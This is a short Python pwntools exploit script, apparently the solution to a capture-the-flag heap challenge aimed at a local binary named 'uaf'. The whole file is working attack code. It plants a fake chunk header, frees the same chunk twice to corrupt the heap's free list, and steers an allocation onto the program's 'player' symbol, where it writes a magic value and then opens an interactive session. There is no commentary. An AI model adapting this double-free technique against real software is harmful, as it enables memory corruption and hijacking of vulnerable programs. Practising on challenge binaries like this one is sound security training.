from pwn import *
context.log_level = 'debug'
p = process("./uaf")
elf = ELF("./uaf")

def mall(data):
	p.sendlineafter("> ", "1")
	p.sendlineafter("> ", str(data))

def free(index):
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", str(index))

def key():
	p.sendlineafter("> ", "3")


fk_chunk = p64(0)
fk_chunk += p64(0x31)
p.sendlineafter("> ", fk_chunk)

mall("AAAA")
mall("BBBB")

free(0)
free(1)
free(0)

target_add = elf.symbols['target']

fk_player_add = elf.symbols['player']

mall(p64(fk_player_add))
mall("AAAA")
mall("BBBB")

mall(p64(0x20210814))

key()

p.interactive()
